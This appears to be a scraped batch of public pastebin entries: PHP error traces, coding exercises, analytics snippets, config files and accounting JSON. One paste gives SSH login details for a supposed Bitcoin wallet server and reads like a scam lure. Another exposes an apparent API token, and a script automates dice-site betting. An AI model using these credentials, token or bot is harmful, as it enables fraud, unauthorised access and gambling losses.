+#48 /var/www/sites/onyx-theremin/wp-includes/class-wp-hook.php(348): WP_Hook->apply_filters()
+#49 /var/www/sites/onyx-theremin/wp-includes/plugin.php(517): WP_Hook->do_action()
+#50 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/tm/class-wpml-tm-page-builders.php(137): do_action()
+#51 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/tm/class-wpml-tm-page-builders-hooks.php(49): WPML_TM_Page_Builders->pro_translation_completed_action()
+#52 /var/www/sites/onyx-theremin/wp-includes/class-wp-hook.php(324): WPML_TM_Page_Builders_Hooks->pro_translation_completed_action()
+#53 /var/www/sites/onyx-theremin/wp-includes/class-wp-hook.php(348): WP_Hook->apply_filters()
+#54 /var/www/sites/onyx-theremin/wp-includes/plugin.php(517): WP_Hook->do_action()
+#55 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/inc/translation-jobs/helpers/wpml-save-translation-data-action.class.php(305): do_action()
+#56 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/classes/menu/translation-editor/class-wpml-tm-editor-save-ajax-action.php(22): WPML_Save_Translation_Data_Action->save_translation()
+#57 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/classes/menu/translation-editor/class-wpml-tm-editor-job-save.php(9): WPML_TM_Editor_Save_Ajax_Action->run()
+#58 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/classes/editor/ClassicEditorActions.php(39): WPML_TM_Editor_Job_Save->save()
+#59 /var/www/sites/onyx-theremin/wp-includes/class-wp-hook.php(324): WPML\TM\Editor\ClassicEditorActions->saveJob()
+#60 /var/www/sites/onyx-theremin/wp-includes/class-wp-hook.php(348): WP_Hook->apply_filters()
+#61 /var/www/sites/onyx-theremin/wp-includes/plugin.php(517): WP_Hook->do_action()
+#62 /var/www/sites/onyx-theremin/wp-admin/admin-ajax.php(188): do_action()
+#63 {main}
+  thrown in /var/www/sites/onyx-theremin/wp-content/plugins/cred-frontend-editor/application/controllers/compatibility/wpml/integration/forms_translation/packages.php on line 84
+[28-Dec-2023 11:12:05 UTC] PHP Fatal error:  Uncaught TypeError: OTGS\Toolset\CRED\Controller\Compatibility\Wpml\Integration\FormsTranslation\Packages::get_form_context(): Argument #1 ($form) must be of type WP_Post, null given, called in /var/www/sites/onyx-theremin/wp-content/plugins/cred-frontend-editor/application/controllers/compatibility/wpml/integration/forms_translation/packages.php on line 110 and defined in /var/www/sites/onyx-theremin/wp-content/plugins/cred-frontend-editor/application/controllers/compatibility/wpml/integration/forms_translation/packages.php:84
+Stack trace:
+#0 /var/www/sites/onyx-theremin/wp-content/plugins/cred-frontend-editor/application/controllers/compatibility/wpml/integration/forms_translation/packages.php(110): OTGS\Toolset\CRED\Controller\Compatibility\Wpml\Integration\FormsTranslation\Packages->get_form_context()
+#1 /var/www/sites/onyx-theremin/wp-content/plugins/cred-frontend-editor/application/controllers/compatibility/wpml/integration/forms_translation/packages.php(336): OTGS\Toolset\CRED\Controller\Compatibility\Wpml\Integration\FormsTranslation\Packages->get_package_context()
+#2 /var/www/sites/onyx-theremin/wp-content/plugins/cred-frontend-editor/application/controllers/compatibility/wpml/integration/forms_translation/packages.php(353): OTGS\Toolset\CRED\Controller\Compatibility\Wpml\Integration\FormsTranslation\Packages->translate_string()
+#3 /var/www/sites/onyx-theremin/wp-includes/shortcodes.php(433): OTGS\Toolset\CRED\Controller\Compatibility\Wpml\Integration\FormsTranslation\Packages->cred_i18n_shortcode()
+#4 [internal function]: do_shortcode_tag()
+#5 /var/www/sites/onyx-theremin/wp-includes/shortcodes.php(273): preg_replace_callback()
+#6 /var/www/sites/onyx-theremin/wp-content/plugins/types/vendor/toolset/toolset-common/inc/autoloaded/interop/shared/page-builders/form-preview-rendering.php(60): do_shortcode()
+#7 /var/www/sites/onyx-theremin/wp-includes/shortcodes.php(433): OTGS\Toolset\Common\Interop\Shared\PageBuilders\ToolsetFormsPreviewRenderer->eliminate_irrelevant_shortcodes()
+#8 [internal function]: do_shortcode_tag()
+#9 /var/www/sites/onyx-theremin/wp-includes/shortcodes.php(273): preg_replace_callback()
+#10 /var/www/sites/onyx-theremin/wp-content/plugins/types/vendor/toolset/toolset-common/inc/autoloaded/interop/shared/page-builders/form-preview-rendering.php(40): do_shortcode()
+#11 /var/www/sites/onyx-theremin/wp-content/plugins/types/vendor/toolset/toolset-common/inc/autoloaded/interop/handler/elementor/widgets/form/form.php(139): OTGS\Toolset\Common\Interop\Shared\PageBuilders\ToolsetFormsPreviewRenderer->render_preview()
+#12 /var/www/sites/onyx-theremin/wp-content/plugins/types/vendor/toolset/toolset-common/inc/autoloaded/interop/handler/elementor/widgets/form/form.php(118): OTGS\Toolset\Common\Interop\Handler\Elementor\FormWidget->render_backend_widget_preview()
+#13 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/base/controls-stack.php(2297): OTGS\Toolset\Common\Interop\Handler\Elementor\FormWidget->render()
+#14 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/base/widget-base.php(614): Elementor\Controls_Stack->render_by_mode()
+#15 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/base/widget-base.php(678): Elementor\Widget_Base->render_content()
+#16 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/db.php(202): Elementor\Widget_Base->render_plain_content()
+#17 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/db.php(208): Elementor\DB->render_element_plain_content()
+#18 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/db.php(558): Elementor\DB->render_element_plain_content()
+#19 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/db.php(539): Elementor\DB->get_plain_text_from_data()
+#20 /var/www/sites/onyx-theremin/wp-content/plugins/elementor/includes/db.php(230): Elementor\DB->get_plain_text()
+#21 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Integrations/Elementor/class-wpml-elementor-db.php(19): Elementor\DB->save_plain_text()
+#22 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Integrations/Elementor/class-wpml-elementor-data-settings.php(58): WPML_Elementor_DB->save_plain_text()
+#23 /var/www/sites/onyx-theremin/wp-includes/class-wp-hook.php(324): WPML_Elementor_Data_Settings->save_post_body_as_plain_text()
+#24 /var/www/sites/onyx-theremin/wp-includes/class-wp-hook.php(348): WP_Hook->apply_filters()
+#25 /var/www/sites/onyx-theremin/wp-includes/plugin.php(517): WP_Hook->do_action()
+#26 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/st/strategy/api-hooks/class-wpml-pb-update-api-hooks-in-content.php(19): do_action()
+#27 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/st/class-wpml-pb-update-post.php(62): WPML_PB_Update_API_Hooks_In_Content->update()
+#28 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/st/class-wpml-pb-update-post.php(38): WPML_PB_Update_Post->update_post()
+#29 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/st/class-wpml-pb-string-translation-by-strategy.php(47): WPML_PB_Update_Post->update()
+#30 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/st/class-wpml-pb-integration.php(323): WPML_PB_String_Translation_By_Strategy->save_translations_to_post()
+#31 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/fp/core/Fns.php(175): WPML_PB_Integration->{closure}()
+#32 [internal function]: WPML\FP\Fns::WPML\FP\{closure}()
+#33 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/fp/core/functions.php(154): call_user_func_array()
+#34 [internal function]: WPML\FP\{closure}()
+#35 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/fp/core/Fns.php(164): array_map()
+#36 [internal function]: WPML\FP\Fns::WPML\FP\{closure}()
+#37 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/fp/core/functions.php(154): call_user_func_array()
+#38 [internal function]: WPML\FP\Fns::WPML\FP\{closure}()
+#39 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/collect/src/Illuminate/Support/Traits/Macroable.php(56): call_user_func_array()
+#40 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/fp/core/Fns.php(169): WPML\FP\Fns::__callStatic()
+#41 [internal function]: WPML\FP\Fns::WPML\FP\{closure}()
+#42 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/fp/core/functions.php(154): call_user_func_array()
+#43 [internal function]: WPML\FP\Fns::WPML\FP\{closure}()
+#44 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/vendor/wpml/collect/src/Illuminate/Support/Traits/Macroable.php(56): call_user_func_array()
+#45 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/st/class-wpml-pb-integration.php(288): WPML\FP\Fns::__callStatic()
+#46 /var/www/sites/onyx-theremin/wp-content/plugins/sitepress-multilingual-cms/addons/wpml-page-builders/classes/Shared/st/class-wpml-pb-integration.php(324): WPML_PB_Integration->with_strategies()
+#47 /var/www/sites/onyx-theremin/wp-includes/class-wp-hook.php(324): WPML_PB_Integration->save_translations_to_post()
+#48 /var/www/sites/onyx-theremin/wp-includes/class-wp-hook.php(348): WP_Hook->apply_filters()
+#49 /var/www/sites/onyx-theremin/wp-includes/plugin.php(517): WP_Hook->do_action()
+#50 /var/www/sites/onyx-theremin/wp-includes/load.php(1260): do_action()
+#51 [internal function]: shutdown_action_hook()
+#52 {main}
+  thrown in /var/www/sites/onyx-theremin/wp-content/plugins/cred-frontend-editor/application/controllers/compatibility/wpml/integration/forms_translation/packages.php on line 84
+"
+rKKfafNM,СПРИНТ № 5 | Итераторы | Урок 5: Итераторы в методах контейнеров 2/3,chevengur,C++,Thursday 28th of December 2023 05:10:55 AM CDT,"#include <algorithm>
+#include <iostream>
+#include <set>
+#include <string>
+#include <vector>
+
+using namespace std;
+
+template <typename It>
+void PrintRange(It range_begin, It range_end) {
+    for (auto it = range_begin; it != range_end; ++it) {
+        cout << *it << "" ""s;
+    }
+    cout << endl;
+}
+
+template <typename It>
+auto MakeSet(It range_begin, It range_end) {
+    return set(range_begin, range_end);
+}
+
+template <typename It>
+auto MakeVector(It range_begin, It range_end){
+    return vector(range_begin, range_end);
+}
+
+template <typename Container, typename IteratorType>
+void EraseAndPrint(Container& con, IteratorType start_) {
+    auto it_erase = con.erase(std::next(con.begin(), start_));
+    PrintRange(con.begin(), it_erase);
+    PrintRange(it_erase, con.end());
+}
+
+int main() {
+    vector<string> langs = {""Python""s, ""Java""s, ""C#""s, ""Ruby""s, ""C++""s};
+    EraseAndPrint(langs, 2);
+    return 0;
+} "
+ZB7sZaSJ,Untitled,Snich101,HTML 5,Thursday 28th of December 2023 04:55:31 AM CDT,"<script setup>
+	const { data: todos, pending, error, refresh } = await useFetch(""/api/todos"");
+
+	const newTodo = ref("""");
+
+	function editTodo(e) {
+		e.target.readOnly = false;
+		e.target.selectionStart = e.target.selectionEnd = e.target.value.length;
+	}
+
+	function updateTodo(e, todo) {
+		saveTodoEdits(todo);
+		e.target.readOnly = true;
+	}
+
+	async function addTodo(e) {
+		try {
+			await $fetch(""/api/todos/create"", {
+				method: ""POST"",
+				body: {
+					todo: newTodo.value,
+					done: false,
+				},
+			});
+			refresh();
+		} catch (error) {
+			console.log(error);
+		} finally {
+			newTodo.value = """";
+		}
+	}
+
+	async function saveTodoEdits(todo) {
+		try {
+			await $fetch(`/api/todos/${todo._id}`, {
+				method: ""PUT"",
+				body: todo,
+			});
+			refresh();
+		} catch (error) {
+			console.log(error);
+		}
+	}
+
+	async function deleteTodo(todo) {
+		console.log(todo);
+		try {
+			await $fetch(`/api/todos/${todo._id}`, {
+				method: ""DELETE"",
+			});
+			refresh();
+		} catch (error) {
+			console.error(error);
+		}
+	}
+</script>
+
+<template>
+	<div id=""app"">
+		<div style=""width: 600px"">
+			<UContainer class=""mb-4 border rounded-md border-gray-400"">
+				<UTable
+					:columns=""[
+						{ key: 'done' },
+						{ key: 'todo', label: 'Todo' },
+						{ key: 'delete' },
+					]""
+					:rows=""todos""
+				>
+					<template #done-data=""{ row }"">
+						<UCheckbox v-model=""row.done"" @change=""saveTodoEdits(row)"" />
+					</template>
+
+					<template #todo-data=""{ row }"">
+						<UInput
+							inputClass=""line-through""
+							variant=""none""
+							readonly=""true""
+							v-model=""row.todo""
+							@click=""console.log(row.done)""
+							@dblclick=""editTodo""
+							@keypress.enter=""(e) => updateTodo(e, row)""
+							@blur=""(e) => updateTodo(e, row)""
+						/>
+					</template>
+
+					<template #delete-data=""{ row }"">
+						<UButton
+							icon=""i-heroicons-trash-solid""
+							color=""red""
+							@click=""deleteTodo(row)""
+						/>
+					</template>
+				</UTable>
+			</UContainer>
+
+			<form class=""flex space-x-4"" @submit.prevent=""addTodo"">
+				<UInput class=""flex-grow"" v-model=""newTodo"" />
+				<UButton type=""submit"">Add</UButton>
+			</form>
+		</div>
+	</div>
+</template>
+
+<style scoped>
+	#app {
+		height: 100vh;
+		display: grid;
+		place-content: center;
+	}
+</style>
+"
+chBSjrGV,Generate lead,Vojkovic,JavaScript,Thursday 28th of December 2023 04:42:45 AM CDT,"window.dataLayer = window.dataLayer || [];
+window.dataLayer.push({ ecommerce: null });
+window.dataLayer.push({
+      'event' : 'generate_lead', 			// name of event, it should be always generate_lead
+      'type' : 'newsletter',				// type of event in case in future we have generate lead on some other page
+ });"
+6e3D1bab,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Thursday 28th of December 2023 04:32:50 AM CDT,"Dear Moe,
+We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.
+
+Your new login credentials will be 
+chefman440:Jmh3x9ZB on 149.28.231.183
+You can connect via SSH.
+
+Regards,
+GM-734366"
+SFWLpcYB,View Cart,Vojkovic,JavaScript,Thursday 28th of December 2023 04:31:15 AM CDT,"window.dataLayer = window.dataLayer || [];
+window.dataLayer.push({ ecommerce: null });
+window.dataLayer.push({
+  event: 'view_cart',  			// name of the event. In this case, it always must be view_cart
+  ecommerce: {
+    currency: 'USD',                     // Currency of the items associated with the event, in 3-letter ISO 4217 format.
+    value: 196.00,                       // value: Sum of cart (Subtotal) + Shipping + Tax - Order Level Discount + donations
+    coupon: 'free_back_rub',            // returns the Order Level coupon/promo code.
+    discount: '10.00',                  // returns the Order level discount amount when an ORDER LEVEL promo is applied
+    items: [{
+      item_name: 'Pause and Rewind',        // ID / SKU of the product.
+      item_id: 'mp1122',                    // Name of the product.
+      price: '62.00',                       //Price of this product.
+      item_brand: 'Dare2Wear',              //Product brand
+      item_category: 'black&white',         // Product Category 1  | insert an actual product top-level category-
+      item_category2: 'time-art-print',     // Product Category 2  | if it is possible to drill down the categories-
+      item_category3: 'Art',                // Product Category 3  | (e.g. Apparel, then T-shirt, then Men),- 
+      item_category4: 'Unisex',             // Product Category 4  | use item_category2, item_category3, etc.-
+      item_category5: 'Unisex',             // Product Category 5  |  Can use from item_category up to item_category5
+      item_variant: '11 X 14',              // Product Size
+      quantity: '3'                         // returns the quantity added to the cart.
+      item_coupon: 'cheap_stain_removal'    // returns the Product Level coupon/promo code.
+      item_discount:                        // returns the product level discount amount when a PRODUCT LEVEL promo is applied
+    },{
+      item_name: 'Charity Donation',
+      item_id: 'psr1332',
+      price: '10.00',
+      item_brand: 'goodszilla',
+      item_category: ' ACADEMIE LAFONTAINE INC',
+      item_category2: 'Utility',
+      item_category3: 'Care product',
+      quantity: '1',
+      
+    }]
+  }
+});"
+nZ8W8wHy,view item,Vojkovic,JavaScript,Thursday 28th of December 2023 04:28:25 AM CDT,"window.dataLayer = window.dataLayer || [];
+window.dataLayer.push({ ecommerce: null });
+window.dataLayer.push({
+  event: 'view_item',  			// name of the event. In this case, it always must be view_item
+  ecommerce: {
+    currency: 'USD',                     // Currency of the items associated with the event, in 3-letter ISO 4217 format.
+    value: 196.00,                       // value: Sum of cart (Subtotal) + Shipping + Tax - Order Level Discount + donations
+    coupon: 'free_back_rub',            // returns the Order Level coupon/promo code.
+    discount: '10.00',                  // returns the Order level discount amount when a ORDER LEVEL promo is applied
+    items: [{
+      item_name: 'Pause and Rewind',        // ID / SKU of the product.
+      item_id: 'mp1122',                    // Name of the product.
+      price: '62.00',                       //Price of this product.
+      item_brand: 'Dare2Wear',              //Product brand
+      item_category: 'black&white',         // Product Category 1  | insert an actual product top-level category-
+      item_category2: 'time-art-print',     // Product Category 2  | if it is possible to drill down the categories-
+      item_category3: 'Art',                // Product Category 3  | (e.g. Apparel, then T-shirt, then Men),- 
+      item_category4: 'Unisex',             // Product Category 4  | use item_category2, item_category3, etc.-
+      item_category5: 'Unisex',             // Product Category 5  |  Can use from item_category up to item_category5
+      item_variant: '11 X 14',              // Product Size
+      quantity: '1'                         // returns the quantity added to the cart.
+      item_coupon: 'cheap_stain_removal'    // returns the Product Level coupon/promo code.
+      item_discount:                        // returns the product level discount amount when a PRODUCT LEVEL promo is applied
+    
+    }]
+  }
+});"
+ztLLc4NL,Remove from Cart,Vojkovic,JavaScript,Thursday 28th of December 2023 04:26:19 AM CDT,"window.dataLayer = window.dataLayer || [];
+window.dataLayer.push({ ecommerce: null });
+window.dataLayer.push({
+  event: 'remove_from_cart',  			// name of the event. In this case, it always must be remove_from_cart
+  ecommerce: {
+    currency: 'USD',                     // Currency of the items associated with the event, in 3-letter ISO 4217 format.
+    value: 196.00,                       // value: Sum of cart (Subtotal) + Shipping + Tax - Order Level Discount + donations
+    coupon: 'free_back_rub',            // returns the Order Level coupon/promo code.
+    discount: '10.00',                  // returns the Order level discount amount when a ORDER LEVEL promo is applied
+    items: [{
+      item_name: 'Pause and Rewind',        // ID / SKU of the product.
+      item_id: 'mp1122',                    // Name of the product.
+      price: '62.00',                       //Price of this product.
+      item_brand: 'Dare2Wear',              //Product brand
+      item_category: 'black&white',         // Product Category 1  | insert an actual product top-level category-
+      item_category2: 'time-art-print',     // Product Category 2  | if it is possible to drill down the categories-
+      item_category3: 'Art',                // Product Category 3  | (e.g. Apparel, then T-shirt, then Men),- 
+      item_category4: 'Unisex',             // Product Category 4  | use item_category2, item_category3, etc.-
+      item_category5: 'Unisex',             // Product Category 5  |  Can use from item_category up to item_category5
+      item_variant: '11 X 14',              // Product Size
+      quantity: '3'                         // returns the quantity added to the cart.
+      item_coupon: 'cheap_stain_removal'    // returns the Product Level coupon/promo code.
+      item_discount:                        // returns the product level discount amount when a PRODUCT LEVEL promo is applied
+    
+    }]
+  }
+});"
+W8jhdvKn,add to cart,Vojkovic,JavaScript,Thursday 28th of December 2023 04:22:35 AM CDT,"window.dataLayer = window.dataLayer || [];
+window.dataLayer.push({ ecommerce: null });
+window.dataLayer.push({
+  event: 'add_to_cart',  			// name of the event. In this case, it always must be add_to_cart
+  ecommerce: {
+    currency: 'USD',                     // Currency of the items associated with the event, in 3-letter ISO 4217 format.
+    value: 196.00,                       // value: Sum of cart (Subtotal) + Shipping + Tax - Order Level Discount + donations
+    coupon: 'free_back_rub',            // returns the Order Level coupon/promo code.
+    discount: '10.00',                  // returns the Order level discount amount when a ORDER LEVEL promo is applied
+    items: [{
+      item_name: 'Pause and Rewind',        // ID / SKU of the product.
+      item_id: 'mp1122',                    // Name of the product.
+      price: '62.00',                       //Price of this product.
+      item_brand: 'Dare2Wear',              //Product brand
+      item_category: 'black&white',         // Product Category 1  | insert an actual product top-level category-
+      item_category2: 'time-art-print',     // Product Category 2  | if it is possible to drill down the categories-
+      item_category3: 'Art',                // Product Category 3  | (e.g. Apparel, then T-shirt, then Men),- 
+      item_category4: 'Unisex',             // Product Category 4  | use item_category2, item_category3, etc.-
+      item_category5: 'Unisex',             // Product Category 5  |  Can use from item_category up to item_category5
+      item_variant: '11 X 14',              // Product Size
+      quantity: '3'                         // returns the quantity added to the cart.
+      item_coupon: 'cheap_stain_removal'    // returns the Product Level coupon/promo code.
+      item_discount:                        // returns the product level discount amount when a PRODUCT LEVEL promo is applied
+    
+    }]
+  }
+});"
+6ACwuBcE,Untitled,djgragra,YAML,Thursday 28th of December 2023 04:01:32 AM CDT,"ics_calendar:
+  calendars:
+    - name: ""Festività Italiane""
+      url: ""https://www.webcal.guru/it-IT/scarica_calendario?calendar_instance_id=66""
+      include_all_day: true
+      days: 365
+      parser: ""ics""
+    - name: ""Buono a Sapersi""
+      url: ""https://www.webcal.guru/it-IT/scarica_calendario?calendar_instance_id=194""
+      include_all_day: true
+      days: 365
+      parser: ""ics""
+
+
+automation:
+  - alias: ""service_festivita_italiane""
+    id: ""service_festivita_italiane""
+    mode: single
+    trigger:
+      - platform: calendar
+        entity_id: calendar.festivita_italiane
+        event: start
+        id: ""START""
+    condition: []
+    action:
+      - service: input_boolean.turn_on
+        entity_id: input_boolean.holiday_festivita_italiane
+      - delay:
+          hours: 24
+      - service: input_boolean.turn_off
+        entity_id: input_boolean.holiday_festivita_italiane
+      - service: notify.famiglia_telegram
+        data:
+          title: Oggi è...
+          message: ""{{ states.calendar.festivita_italiane.attributes.message }} {{ '\n' }} {{ '\n' }}{{ states.calendar.festivita_italiane.attributes.description }}""   
+
+  - alias: ""service_buono_a_sapersi""
+    id: ""service_buono_a_sapersi""
+    mode: single
+    trigger:
+      - platform: calendar
+        entity_id: calendar.buono_a_sapersi
+        event: start
+        id: ""START""
+    condition: []
+    action:
+      - service: input_boolean.turn_on
+        entity_id: input_boolean.holiday_buono_a_sapersi
+      - delay:
+          hours: 24
+      - service: input_boolean.turn_off
+        entity_id: input_boolean.holiday_buono_a_sapersi
+      - service: notify.famiglia_telegram
+        data:
+          title: Oggi è...
+          message: ""{{ states.calendar.buono_a_sapersi.attributes.message }} {{ '\n' }} {{ '\n' }}{{ states.calendar.buono_a_sapersi.attributes.description }}"""
+WRUdBe1c,best snowybot,coinwalk,JavaScript,Thursday 28th of December 2023 04:00:26 AM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
+var base = (oldestbal/144000); //dont change;
+var bellance = oldestbal;
+var botplus = base;
+var trget = parseFloat(oldestbal);
+var tens = (base*10);
+var sevens = (base*6.9);
+var eights  = (base*7.1)
+var floatingbal = 0;
+var james = oldestbal;
+var fran = oldestbal;
+var betnext = ((botplus*1).toFixed(8));
+ 
+ 
+function get(){
+console.clear();
+bellance = document.getElementById('pct_balance').value;
+var good = ((bellance-oldestbal).toFixed(8));
+console.log(""profit"");
+console.log(good);
+if ((bellance>(((Math.floor(bellance/tens))*tens)+sevens))&&(bellance<(((Math.floor(bellance/tens))*tens)+eights))&&(bellance!=floatingbal)) {
+     botplus = botplus*2;  
+     floatingbal  = parseFloat(bellance);
+}
+if ((botplus>=(base*3))&&(bellance>=fran)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
+    botplus = base;
+    floatingbal = 0;
+    james  = parseFloat(bellance); 
+    fran  = parseFloat(bellance); 
+}
+if (bellance>(trget*24)){
+console.log(""buy ebike"");
+return;
+}
+betnext = ((botplus*1).toFixed(8));
+$('#pct_chance').val(49.5);
+$('#pct_bet').val(betnext);
+$('#a_hi').click();
+setTimeout(() => get(), 100);
+}
+get();"
+56RQDk65,anniversary,SilkKheldar,JavaScript,Thursday 28th of December 2023 03:57:27 AM CDT,"let version  = ""0.1"";
+let createdt = ""28-12-2023"";
+let usage    = '!addcom !anniversary -cd=5 $(eval q=""$(urlfetch https://decapi.me/twitch/followed/$(channel)/$(touser)?token=yQ5wibVbfX4YaZvwBZHd5ZwQPZGyssWq2LTlEflU&tz=Europe/Amsterdam&format=dmo)"";$(urlfetch json https://pastebin.com/raw/56RQDk65))';
+let designer = ""Silkenator23"";
+
+
+const months = [""none"",""January"", ""February"", ""March"", ""April"", ""May"", ""June"", ""July"", ""August"", ""September"", ""October"", ""November"", ""December""];
+
+ var Date_day   = q.slice(0, 2);
+ var Date_month = q.slice(2, 4);
+ var Date_year  = q.slice(4, 8);
+
+
+
+ var Date_year_1 = new Date().getFullYear();
+ var Date_year_2 = Date_year_1 + 1;
+
+var date_cy = new Date(Date_year_1 ,Date_month ,Date_day);
+var date_ny = new Date(Date_year_2 ,Date_month ,Date_day);
+var date_to = new Date();
+
+var date_Result = new Date(Date_year_2 ,Date_month ,Date_day);
+if  (date_cy >= date_to) 
+{date_Result = new Date(Date_year_1 ,Date_month ,Date_day);}
+
+let month = months[date_Result.getMonth()];
+
+let message     = u + "" your next twitch follow anniversary is at ""  +  date_Result.getDate() + "" "" + month  + "" ""  + date_Result.getFullYear() ;
+
+message; 
+"
+ws0rK7gj,Skip-store-review-if-no-product-rating-in-review,palsushobhan,PHP,Thursday 28th of December 2023 03:43:00 AM CDT,"class WCFM_Store_review_modifier {
+    private $review_rating = null;
+    public function __construct($comment_id) {
+        $this->set_review_rating($comment_id);
+        add_filter('wcfmmp_is_allow_product_review_sync_with_store_review', array(&$this, 'can_sync_with_store_review'));
+    }
+    public function set_review_rating($comment_id) {
+        if ( get_option( 'woocommerce_enable_review_rating' ) == 'yes' ) {
+            $this->review_rating = intval( get_comment_meta( $comment_id, 'rating', true ) );
+        }
+    }
+    public function can_sync_with_store_review($is_allowed) {
+        return $is_allowed && $this->review_rating;
+    }
+}
+
+add_action('comment_post', function($comment_id) {
+    new WCFM_Store_review_modifier($comment_id);
+}, 49);"
+x9qWgWUb,UpdateJournalEntry,BlackBoY_,JSON,Thursday 28th of December 2023 03:17:21 AM CDT,"{
+    ""voucher_type"": ""Journal Entry"",
+    ""company"": ""Kopkar Toyota"",
+    ""posting_date"": ""2023-12-21"",
+    ""cheque_no"": ""Toko-Nov2023"",
+    ""cheque_date"": ""2023-12-21"",
+    ""total_debit"": 4000000000.0,
+    ""total_credit"": 4000000000.0,
+    ""difference"": 0.0,
+    ""multi_currency"": 0,
+    ""total_amount_currency"": ""IDR"",
+    ""total_amount"": 4000000000.0,
+    ""accounts"": [
+        {
+            ""account"": ""130-10"",
+            ""account_type"": ""Receivable"",
+            ""balance"": 12000000.0,
+            ""party_type"": ""Customer"",
+            ""party"": ""Anggota"",
+            ""party_balance"": 12000000.0,
+            ""cost_center"": ""Main - Kopkar Toyota"",
+            ""account_currency"": ""IDR"",
+            ""exchange_rate"": 1.0,
+            ""debit_in_account_currency"": 4000000000.0,
+            ""debit"": 4000000000.0,
+            ""credit_in_account_currency"": 0.0,
+            ""credit"": 0.0,
+            ""is_advance"": ""No"",
+            ""against_account"": ""Family Mart"",
+            ""parentfield"": ""accounts"",
+            ""parenttype"": ""Journal Entry"",
+            ""doctype"": ""Journal Entry Account""
+        },
+        {
+
+            ""account"": ""210-10"",
+            ""account_type"": ""Payable"",
+            ""balance"": -12000000.0,
+            ""party_type"": ""Supplier"",
+            ""party"": ""Family Mart"",
+            ""party_balance"": 0.0,
+            ""cost_center"": ""Main - Kopkar Toyota"",
+            ""account_currency"": ""IDR"",
+            ""exchange_rate"": 1.0,
+            ""debit_in_account_currency"": 0.0,
+            ""debit"": 0.0,
+            ""credit_in_account_currency"": 4000000000.0,
+            ""credit"": 4000000000.0,
+            ""is_advance"": ""No"",
+            ""against_account"": ""Anggota"",
+            ""parentfield"": ""accounts"",
+            ""parenttype"": ""Journal Entry"",
+            ""doctype"": ""Journal Entry Account""
+        }
+    ]
+}
+"
+DHSXzPZZ,CreateJournalEntry,BlackBoY_,JSON,Thursday 28th of December 2023 03:15:46 AM CDT,"{
+    ""voucher_type"": ""Journal Entry"",
+    ""company"": ""Kopkar Toyota"",
+    ""posting_date"": ""2023-12-21"",
+    ""cheque_no"": ""Toko-Nov2023"",
+    ""cheque_date"": ""2023-12-21"",
+    ""difference"": 0.0,
+    ""multi_currency"": 0,
+    ""total_amount_currency"": ""IDR"",
+    ""accounts"": [
+        {
+            ""account"": ""510-11"",
+            // ""account_type"": ""Receivable"",
+            // ""party_type"": ""Customer"",
+            // ""party"": ""Anggota"",
+            ""cost_center"": ""Main - Kopkar Toyota"",
+            ""account_currency"": ""IDR"",
+            ""exchange_rate"": 1.0,
+            ""debit_in_account_currency"": 4000000000.0,
+            ""debit"": 4000000000.0,
+            ""credit_in_account_currency"": 0.0,
+            ""credit"": 0.0,
+            ""is_advance"": ""No"",
+            ""against_account"": ""Family Mart"",
+            ""parentfield"": ""accounts"",
+            ""parenttype"": ""Journal Entry"",
+            ""doctype"": ""Journal Entry Account""
+        },
+        {
+            ""account"": ""148-01"",
+            // ""account_type"": ""Payable"",
+            // ""party_type"": """",
+            // ""party"": """",
+            ""party_balance"": 0.0,
+            ""cost_center"": ""Main - Kopkar Toyota"",
+            ""account_currency"": ""IDR"",
+            ""exchange_rate"": 1.0,
+            ""debit_in_account_currency"": 0.0,
+            ""debit"": 0.0,
+            ""credit_in_account_currency"": 4000000000.0,
+            ""credit"": 4000000000.0,
+            ""is_advance"": ""No"",
+            ""against_account"": ""Anggota"",
+            ""parentfield"": ""accounts"",
+            ""parenttype"": ""Journal Entry"",
+            ""doctype"": ""Journal Entry Account""
+        }
+    ]
+}
+"
+dQ1jSZ0j,C# Code listing generator,TimmyChannel,C#,Thursday 28th of December 2023 03:15:36 AM CDT,"using System;
+using System.IO;
